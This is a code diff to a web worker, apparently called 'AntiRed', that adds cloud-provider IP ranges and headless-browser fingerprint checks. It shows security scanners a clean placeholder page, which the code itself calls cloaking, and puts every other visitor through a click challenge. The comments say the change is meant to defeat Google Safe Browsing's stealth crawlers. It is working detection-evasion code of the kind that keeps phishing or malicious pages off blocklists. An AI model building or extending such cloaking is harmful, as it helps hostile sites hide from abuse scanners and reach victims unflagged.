@@ -124,6 +124,45 @@ const SCANNER_IP_RANGES = [
   '64.41.200.0/24',
   // DNSstuff
   '216.52.0.0/16',
+  // ─── Google Cloud & Infrastructure (used by Safe Browsing stealth crawlers) ───
+  '34.0.0.0/9',         // Google Cloud (34.0–34.127)
+  '35.184.0.0/13',      // Google Cloud (35.184–35.191)
+  '35.192.0.0/12',      // Google Cloud (35.192–35.207)
+  '35.208.0.0/12',      // Google Cloud (35.208–35.223)
+  '35.224.0.0/12',      // Google Cloud (35.224–35.239)
+  '35.240.0.0/13',      // Google Cloud (35.240–35.247)
+  '130.211.0.0/22',     // Google Cloud Load Balancers
+  '142.250.0.0/15',     // Google infrastructure (142.250–142.251)
+  '142.251.0.0/16',     // Google infrastructure
+  '172.217.0.0/16',     // Google services
+  '172.253.0.0/16',     // Google services
+  '173.194.0.0/16',     // Google services
+  '209.85.128.0/17',    // Google mail/services
+  '8.8.4.0/24',         // Google Public DNS (used by some scanners)
+  '8.8.8.0/24',         // Google Public DNS
+  '8.34.208.0/20',      // Google Cloud
+  '8.35.192.0/20',      // Google Cloud
+  '23.236.48.0/20',     // Google Cloud
+  '23.251.128.0/19',    // Google Cloud
+  '104.154.0.0/15',     // Google Cloud (104.154–104.155)
+  '104.196.0.0/14',     // Google Cloud (104.196–104.199)
+  '107.167.160.0/19',   // Google Cloud
+  '107.178.192.0/18',   // Google Cloud
+  '146.148.0.0/17',     // Google Cloud
+  '199.192.112.0/22',   // Google Cloud
+  '199.223.232.0/21',   // Google Cloud
+  // ─── AWS Scanning Infrastructure (commonly used by security scanners) ───
+  '3.0.0.0/9',          // AWS (broad — catches most AWS-hosted scanners)
+  '18.0.0.0/8',         // AWS EC2 (broad)
+  '52.0.0.0/10',        // AWS EC2 (52.0–52.63)
+  '54.64.0.0/11',       // AWS EC2 (54.64–54.95)
+  // ─── Azure Scanning Infrastructure ───
+  '13.64.0.0/11',       // Azure (13.64–13.95)
+  '20.33.0.0/16',       // Azure Front Door
+  '40.74.0.0/15',       // Azure (40.74–40.75)
+  '40.112.0.0/13',      // Azure (40.112–40.119)
+  '52.96.0.0/12',       // Azure/O365 (52.96–52.111)
+  '168.63.0.0/16',      // Azure
   // NOTE: Do NOT block Cloudflare proxy IPs (173.245.48.0/20, 103.21.244.0/22, 103.22.200.0/22)
   // When sites are behind CF, ALL traffic comes through these IPs — blocking them = blocking everyone
 ]
@@ -1584,19 +1623,25 @@ function injectHoneypots(html, domain) {
   return html + allTraps;
 }
 
-// ─── Challenge Page ─────────────────────────────────────
-function challengePage(originalUrl) {
+// ─── Challenge Page with Proof-of-Interaction ────────────
+function challengePage(originalUrl, nonce) {
   const safeUrl = encodeURIComponent(originalUrl);
   return \`<!DOCTYPE html>
 <html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <meta name="robots" content="noindex,nofollow">
 <title>Security Check</title>
-<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:#e0e0e0;display:flex;justify-content:center;align-items:center;min-height:100vh}.c{text-align:center;padding:40px;max-width:420px}.s{width:40px;height:40px;border:3px solid #333;border-top-color:#4f8fff;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 24px}@keyframes spin{to{transform:rotate(360deg)}}.t{font-size:18px;margin-bottom:8px;color:#fff}.d{color:#888;font-size:14px}.p{margin-top:20px;height:4px;background:#222;border-radius:2px;overflow:hidden}.pb{height:100%;background:linear-gradient(90deg,#4f8fff,#7c5cff);width:0%;transition:width 0.3s;border-radius:2px}.f{margin-top:16px;color:#555;font-size:12px}</style>
-</head><body><div class="c"><div class="s"></div><div class="t">Verifying your browser</div><div class="d">This is an automatic security check</div><div class="p"><div class="pb" id="pb"></div></div><div class="f" id="st">Please wait...</div></div>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:#e0e0e0;display:flex;justify-content:center;align-items:center;min-height:100vh}.c{text-align:center;padding:40px;max-width:420px}.s{width:40px;height:40px;border:3px solid #333;border-top-color:#4f8fff;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 24px}@keyframes spin{to{transform:rotate(360deg)}}.t{font-size:18px;margin-bottom:8px;color:#fff}.d{color:#888;font-size:14px}.p{margin-top:20px;height:4px;background:#222;border-radius:2px;overflow:hidden}.pb{height:100%;background:linear-gradient(90deg,#4f8fff,#7c5cff);width:0%;transition:width 0.3s;border-radius:2px}.f{margin-top:16px;color:#555;font-size:12px}.vb{display:none;margin-top:24px;padding:14px 40px;background:linear-gradient(135deg,#4f8fff,#7c5cff);color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;transition:transform 0.15s,box-shadow 0.15s;box-shadow:0 4px 15px rgba(79,143,255,0.3)}.vb:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(79,143,255,0.4)}.vb:active{transform:translateY(0)}.vb.show{display:inline-block;animation:fadeIn 0.4s ease}.fl{display:none;margin-top:16px;color:#f44;font-size:14px}@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}</style>
+</head><body><div class="c"><div class="s" id="sp"></div><div class="t" id="tt">Verifying your browser</div><div class="d" id="dd">This is an automatic security check</div><div class="p"><div class="pb" id="pb"></div></div><div class="f" id="st">Please wait...</div><button class="vb" id="vb">Continue to site</button><div class="fl" id="fl">Verification failed. Please use a standard browser.</div></div>
 <script>
 (function(){
+  var NONCE='\${nonce}';
   var sc=0,pb=document.getElementById('pb'),st=document.getElementById('st');
+  var vb=document.getElementById('vb'),fl=document.getElementById('fl');
+  var sp=document.getElementById('sp'),tt=document.getElementById('tt'),dd=document.getElementById('dd');
+  var poiReady=false;
   function up(p,t){pb.style.width=p+'%';st.textContent=t;}
+
+  // Phase 1: Automated bot detection
   up(10,'Checking browser environment...');
   if(navigator.webdriver)sc+=40;
   if(/HeadlessChrome|PhantomJS|Nightmare/.test(navigator.userAgent))sc+=50;
@@ -1610,22 +1655,58 @@ function challengePage(originalUrl) {
   if(cn&&cn.rtt===0&&!/localhost/.test(location.hostname))sc+=15;
   if(!window.requestAnimationFrame)sc+=10;
   try{if(window.outerWidth===0||window.outerHeight===0)sc+=20;}catch(e){}
-  setTimeout(function(){up(40,'Verifying identity...');},500);
-  setTimeout(function(){up(70,'Almost done...');},1500);
+  // Puppeteer/Playwright/CDP detection
+  if(window.__puppeteer_evaluation_script__)sc+=50;
+  if(navigator.userAgent.includes('Headless'))sc+=50;
+  try{if(Object.getOwnPropertyNames(navigator).includes('webdriver'))sc+=30;}catch(e){}
+  try{if(window.cdc_adoQpoasnfa76pfcZLmcfl_Array||window.cdc_adoQpoasnfa76pfcZLmcfl_Promise)sc+=50;}catch(e){}
+  if(screen.width===0||screen.height===0)sc+=30;
+  if(screen.width===800&&screen.height===600)sc+=15;
+  if(!navigator.permissions)sc+=10;
+  // WebGL renderer check (headless uses SwiftShader)
+  try{var cv=document.createElement('canvas');var gl=cv.getContext('webgl')||cv.getContext('experimental-webgl');if(gl){var dbg=gl.getExtension('WEBGL_debug_renderer_info');if(dbg){var rr=gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);if(/SwiftShader|llvmpipe|softpipe/i.test(rr))sc+=30;}}}catch(e){}
+
+  setTimeout(function(){up(40,'Verifying identity...');},600);
+  setTimeout(function(){up(70,'Almost done...');},1800);
+
+  // Phase 2: Decision at 3s
   setTimeout(function(){
-    if(sc>=40){
+    if(sc>=35){
       up(100,'Verification failed');
+      fl.style.display='block';
+      sp.style.borderTopColor='#f44';
+      sp.style.animationPlayState='paused';
       st.style.color='#f44';
-      document.querySelector('.s').style.borderTopColor='#f44';
-      document.querySelector('.s').style.animationPlayState='paused';
       return;
     }
-    up(100,'Verified ✓');
-    st.style.color='#4ade80';
-    document.querySelector('.s').style.display='none';
-    var verifyUrl='/__ar_verify?r=\${safeUrl}&t='+Math.floor(Date.now()/1000);
-    setTimeout(function(){window.location.href=verifyUrl;},300);
-  },2500);
+    // Automated checks passed — require proof of interaction (click)
+    up(100,'One more step...');
+    sp.style.display='none';
+    tt.textContent='Almost there';
+    dd.textContent='Click the button below to continue';
+    st.textContent='';
+    vb.classList.add('show');
+    poiReady=true;
+  },3000);
+
+  // Phase 3: Proof-of-Interaction — button click required
+  vb.addEventListener('click',function(){
+    if(!poiReady)return;
+    vb.disabled=true;
+    vb.textContent='Verifying...';
+    var ts=Math.floor(Date.now()/1000);
+    // Nonce was pre-computed by the Worker and embedded in this page
+    window.location.href='/__ar_verify?r=\${safeUrl}&t='+ts+'&poi='+NONCE;
+  });
+
+  // Timeout after 30s
+  setTimeout(function(){
+    if(poiReady&&vb.classList.contains('show')&&!vb.disabled){
+      st.textContent='Session timed out. Please refresh the page.';
+      st.style.color='#f44';
+      vb.style.display='none';
+    }
+  },33000);
 })();
 </script></body></html>\`;
 }
@@ -1661,10 +1742,17 @@ async function handleRequest(request) {
     });
   }
 
-  // ── Step 3: Bot score calculation ──
+  // ── Step 3: Skip challenge for static assets ──
+  const ext = url.pathname.split('.').pop().toLowerCase();
+  const staticExts = ['css','js','png','jpg','jpeg','gif','svg','ico','woff','woff2','ttf','eot','map','xml','pdf','zip','mp4','mp3','webp','avif','webmanifest'];
+  if (staticExts.includes(ext)) {
+    return fetch(request);
+  }
+
+  // ── Step 4: Bot score calculation ──
   const botScore = calculateBotScore(ua, ip);
 
-  // HIGH SCORE (100+) → Known scanner → Clean placeholder (cloaking)
+  // HIGH SCORE (100+) → Known scanner IP/UA → Clean placeholder immediately
   if (botScore >= 100) {
     return new Response(CLEAN_PLACEHOLDER, {
       status: 200,
@@ -1676,24 +1764,24 @@ async function handleRequest(request) {
     });
   }
 
-  // MEDIUM SCORE (40-99) → Suspicious → Challenge required
-  const needsChallenge = botScore >= 40;
-
-  // Skip challenge for static assets
-  const ext = url.pathname.split('.').pop().toLowerCase();
-  const staticExts = ['css','js','png','jpg','jpeg','gif','svg','ico','woff','woff2','ttf','eot','map','xml','pdf','zip','mp4','mp3','webp','avif','webmanifest'];
-  if (staticExts.includes(ext)) {
-    return fetch(request);
-  }
-
-  // ── Step 4: Handle verification redirect ──
+  // ── Step 5: Handle verification redirect ──
   if (url.pathname === '/__ar_verify') {
     const returnUrl = url.searchParams.get('r') || '/';
     const timestamp = url.searchParams.get('t');
+    const poi = url.searchParams.get('poi');
     const now = Math.floor(Date.now() / 1000);
     const ts = parseInt(timestamp);
-    if (isNaN(ts) || Math.abs(now - ts) > 30) {
-      return Response.redirect(url.origin + decodeURIComponent(returnUrl), 302);
+    // Verify timestamp is recent (within 60s) and PoI token exists
+    if (isNaN(ts) || Math.abs(now - ts) > 60 || !poi) {
+      return Response.redirect(url.origin + '/', 302);
+    }
+    // Verify PoI nonce — it's an HMAC of IP + minute-window, computed when challenge was served
+    const minute = Math.floor(ts / 60);
+    const expectedPoi = await hmac('poi_' + ip + '_' + minute);
+    const expectedPoiPrev = await hmac('poi_' + ip + '_' + (minute - 1));
+    // Accept current or previous minute window (handles boundary crossings)
+    if (poi !== expectedPoi.substring(0, 16) && poi !== expectedPoiPrev.substring(0, 16)) {
+      return Response.redirect(url.origin + '/', 302);
     }
     const cookieValue = await makeCookieValue();
     const expiry = new Date(Date.now() + COOKIE_MAX_AGE * 1000).toUTCString();
@@ -1708,26 +1796,24 @@ async function handleRequest(request) {
     });
   }
 
-  // ── Step 5: Check challenge cookie ──
+  // ── Step 6: Check challenge cookie ──
   const cookies = request.headers.get('Cookie') || '';
   const hasCookie = await verifyCookie(cookies);
 
-  if (hasCookie || !needsChallenge) {
-    // Cookie valid OR low bot score → pass through + inject honeypots into HTML
+  if (hasCookie) {
+    // Valid cookie → verified human → pass through + inject honeypots
     const response = await fetch(request);
     const contentType = response.headers.get('Content-Type') || '';
     const newHeaders = new Headers(response.headers);
-    newHeaders.set('X-AntiRed', hasCookie ? 'verified' : 'passed');
+    newHeaders.set('X-AntiRed', 'verified');
 
-    // Inject honeypot traps into HTML responses
     if (contentType.includes('text/html')) {
       try {
         let html = await response.text();
         html = injectHoneypots(html, domain);
-        newHeaders.delete('content-length'); // recalculate
+        newHeaders.delete('content-length');
         return new Response(html, { status: response.status, headers: newHeaders });
       } catch (e) {
-        // If injection fails, return original response
         return new Response(response.body, { status: response.status, headers: newHeaders });
       }
     }
@@ -1735,8 +1821,14 @@ async function handleRequest(request) {
     return new Response(response.body, { status: response.status, headers: newHeaders });
   }
 
-  // ── Step 6: No valid cookie + needs challenge → challenge page ──
-  return new Response(challengePage(url.pathname + url.search), {
+  // ── Step 7: No valid cookie → EVERYONE gets challenged (this is the key security fix) ──
+  // Even "clean" looking requests must prove they are human via proof-of-interaction.
+  // This blocks Google Safe Browsing stealth scanners that use real Chrome + standard UAs.
+  // Compute PoI nonce (HMAC of IP + minute window) — embedded in challenge page
+  const poiMinute = Math.floor(Date.now() / 1000 / 60);
+  const poiNonce = (await hmac('poi_' + ip + '_' + poiMinute)).substring(0, 16);
+
+  return new Response(challengePage(url.pathname + url.search, poiNonce), {
     status: 200,
     headers: {
       'Content-Type': 'text/html; charset=utf-8',
